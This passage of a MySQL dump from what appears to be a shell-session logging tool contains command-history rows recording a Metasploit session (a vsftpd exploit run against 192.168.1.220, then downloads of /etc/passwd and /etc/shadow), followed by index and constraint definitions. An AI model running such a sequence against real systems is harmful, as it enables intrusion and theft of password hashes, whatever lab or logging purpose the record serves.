(1, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'search vsftpd', 'response', '2025-07-29 05:49:37', 1, '2025-07-29 05:49:38', 5),
(2, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'use 1', 'response', '2025-07-29 05:49:54', 1, '2025-07-29 05:49:54', 5),
(3, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'show options', 'response', '2025-07-29 05:50:23', 1, '2025-07-29 05:50:23', 5),
(4, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'set RHOSTS 192.168.1.220', 'response', '2025-07-29 05:50:48', 1, '2025-07-29 05:50:49', 5),
(5, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'exploit', 'response', '2025-07-29 05:50:56', 1, '2025-07-29 05:50:56', 5),
(6, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'download /etc/passwd /home/kali/Desktop/files/passwd', 'response', '2025-07-29 05:51:38', 1, '2025-07-29 05:51:38', 5),
(7, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'download /etc/shadow /home/kali/Desktop/files/shadow', 'response', '2025-07-29 05:51:48', 1, '2025-07-29 05:51:48', 5),
(8, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'exit', 'response', '2025-07-29 05:52:16', 1, '2025-07-29 05:52:16', 5),
(9, 'sess_20250729_054649_0063b49b7bed841f', 'kali-20d10699', 14, NULL, 'exit', 'response', '2025-07-29 05:52:24', 1, '2025-07-29 05:52:24', 5);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `command_history`
--
ALTER TABLE `command_history`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_host_session` (`host_id`,`session_id`),
  ADD KEY `idx_session_time` (`session_id`,`timestamp`),
  ADD KEY `idx_status_time` (`status`,`timestamp`),
  ADD KEY `idx_working_dir` (`host_id`,`working_directory`(100)),
  ADD KEY `idx_is_interactive` (`is_interactive`),
  ADD KEY `idx_status` (`status`),
  ADD KEY `idx_interactive_status` (`is_interactive`,`status`,`timestamp`),
  ADD KEY `idx_session_status` (`session_id`,`status`,`timestamp`);

--
-- Indexes for table `command_statistics`
--
ALTER TABLE `command_statistics`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `unique_host_command` (`host_id`,`command_base`),
  ADD KEY `idx_host_stats` (`host_id`,`execution_count`);

--
-- Indexes for table `hosts`
--
ALTER TABLE `hosts`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `host_id` (`host_id`),
  ADD KEY `idx_host_status` (`connected`,`last_seen`),
  ADD KEY `idx_host_id` (`host_id`);

--
-- Indexes for table `host_instance_mappings`
--
ALTER TABLE `host_instance_mappings`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_host_instance` (`host_id`,`instance_token`),
  ADD KEY `idx_instance_active` (`instance_token`,`is_active`),
  ADD KEY `idx_token_expires` (`instance_token`,`expires_at`,`is_active`);

--
-- Indexes for table `interactive_command_patterns`
--
ALTER TABLE `interactive_command_patterns`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shell_sessions`
--
ALTER TABLE `shell_sessions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `session_id` (`session_id`),
  ADD KEY `idx_session_active` (`session_id`,`is_active`),
  ADD KEY `idx_session_host` (`host_id`,`is_active`,`last_activity`);

--
-- Indexes for table `streaming_output`
--
ALTER TABLE `streaming_output`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `unique_command_sequence` (`command_id`,`chunk_sequence`),
  ADD KEY `idx_session_time` (`session_id`,`last_update`),
  ADD KEY `idx_command_id` (`command_id`);

--
-- Indexes for table `streaming_sessions`
--
ALTER TABLE `streaming_sessions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `command_id` (`command_id`),
  ADD KEY `idx_session_status` (`session_id`,`status`);

--
-- Indexes for table `user_input_queue`
--
ALTER TABLE `user_input_queue`
  ADD PRIMARY KEY (`id`),
  ADD KEY `idx_session_processed` (`session_id`,`processed`,`timestamp`),
  ADD KEY `idx_processed` (`processed`),
  ADD KEY `idx_priority_processing` (`session_id`,`host_id`,`processed`,`priority`,`timestamp`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `command_history`
--
ALTER TABLE `command_history`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `command_statistics`
--
ALTER TABLE `command_statistics`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `hosts`
--
ALTER TABLE `hosts`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `host_instance_mappings`
--
ALTER TABLE `host_instance_mappings`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `interactive_command_patterns`
--
ALTER TABLE `interactive_command_patterns`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT for table `shell_sessions`
--
ALTER TABLE `shell_sessions`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `streaming_output`
--
ALTER TABLE `streaming_output`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `streaming_sessions`
--
ALTER TABLE `streaming_sessions`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `user_input_queue`
--
ALTER TABLE `user_input_queue`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `command_history`
--
ALTER TABLE `command_history`
  ADD CONSTRAINT `command_history_ibfk_1` FOREIGN KEY (`host_id`) REFERENCES `hosts` (`host_id`) ON DELETE CASCADE;

--
-- Constraints for table `command_statistics`
--
ALTER TABLE `command_statistics`
  ADD CONSTRAINT `command_statistics_ibfk_1` FOREIGN KEY (`host_id`) REFERENCES `hosts` (`host_id`) ON DELETE CASCADE;

--
-- Constraints for table `host_instance_mappings`
--
ALTER TABLE `host_instance_mappings`
  ADD CONSTRAINT `host_instance_mappings_ibfk_1` FOREIGN KEY (`host_id`) REFERENCES `hosts` (`host_id`) ON DELETE CASCADE;

--
-- Constraints for table `shell_sessions`
--
ALTER TABLE `shell_sessions`
  ADD CONSTRAINT `shell_sessions_ibfk_1` FOREIGN KEY (`host_id`) REFERENCES `hosts` (`host_id`) ON DELETE CASCADE;
SET FOREIGN_KEY_CHECKS=1;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
